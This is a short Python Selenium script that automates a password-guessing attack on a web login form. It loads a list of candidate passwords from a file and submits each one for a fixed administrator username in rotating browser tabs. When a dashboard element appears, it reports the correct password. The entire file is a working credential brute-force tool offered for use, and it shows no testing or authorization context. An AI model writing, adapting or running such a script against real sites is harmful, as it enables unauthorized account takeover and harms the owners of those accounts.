from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager

# ---------- CONFIG ----------
LOGIN_URL = "https://www.demo.ini"
USERNAME = "admin1"
PASSWORD_FILE = "pass.txt"
MAX_TABS = 4

# ---------- LOAD PASSWORDS ----------
with open(PASSWORD_FILE, "r") as f:
    passwords = [p.strip() for p in f if p.strip()]

# ---------- DRIVER ----------
driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
driver.maximize_window()

main_tab = driver.current_window_handle
open_tabs = [main_tab]

# ---------- LOGIN CHECK ----------
def login_success(driver):
    try:
        WebDriverWait(driver, 5).until(
            EC.presence_of_element_located((By.ID, "dashboard"))
        )
        return True
    except TimeoutException:
        return False

def login_failed(driver):
    try:
        WebDriverWait(driver, 3).until(
            EC.presence_of_element_located(
                (By.XPATH, "//*[contains(text(),'Invalid') or contains(text(),'error')]")
            )
        )
        return True
    except TimeoutException:
        return False

# ---------- MAIN LOOP ----------
for index, password in enumerate(passwords, start=1):
    print(f"Trying password {index}: {password}")

    # --- OPEN NEW TAB ---
    driver.switch_to.window(main_tab)
    driver.execute_script("window.open('about:blank','_blank');")
    driver.switch_to.window(driver.window_handles[-1])
    open_tabs.append(driver.current_window_handle)

    driver.get(LOGIN_URL)

    try:
        wait = WebDriverWait(driver, 10)

        user = wait.until(EC.presence_of_element_located((By.NAME, "username")))
        pwd = driver.find_element(By.NAME, "password")

        user.clear()
        pwd.clear()
        user.send_keys(USERNAME)
        pwd.send_keys(password)

        btn = wait.until(
            EC.element_to_be_clickable((By.XPATH, "//button[@type='submit']"))
        )
        driver.execute_script("arguments[0].click();", btn)

        # ---------- RESULT CHECK ----------
        if login_success(driver):
            print("\n✅ LOGIN SUCCESSFUL")
            print(f"🔑 Correct password: {password}")
            print("🟢 Browser will stay open")
            input("Press ENTER to exit...")
            break

        if login_failed(driver):
            print("❌ Wrong password (tab kept open)")

    except Exception as e:
        print(f"⚠️ Error: {e}")

    # ---------- TAB QUEUE CONTROL ----------
    if len(open_tabs) > MAX_TABS:
        oldest_tab = open_tabs.pop(0)
        driver.switch_to.window(oldest_tab)
        driver.close()
        driver.switch_to.window(open_tabs[-1])
